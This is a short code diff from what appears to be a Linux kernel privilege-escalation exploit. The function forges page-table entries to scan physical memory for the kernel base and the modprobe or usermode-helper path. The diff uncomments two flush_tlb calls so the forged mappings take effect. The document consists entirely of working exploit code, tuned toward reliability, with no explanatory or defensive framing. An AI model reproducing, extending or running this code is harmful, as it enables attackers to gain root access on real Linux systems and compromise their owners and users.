@@ -394,7 +394,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		for (unsigned short j=0; j < 512; j++)
 			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;
 
-		//flush_tlb(_pmd_area, 0x400000);
+		flush_tlb(_pmd_area, 0x400000);
 
 		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
 		for (unsigned long long j=0; j < 512; j++) 
@@ -431,7 +431,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 				for (unsigned short j=0; j < 512; j++)
 					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;
 
-				//flush_tlb(_pmd_area, 0x400000);
+				flush_tlb(_pmd_area, 0x400000);
 				
 #if CONFIG_STATIC_USERMODEHELPER
 				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
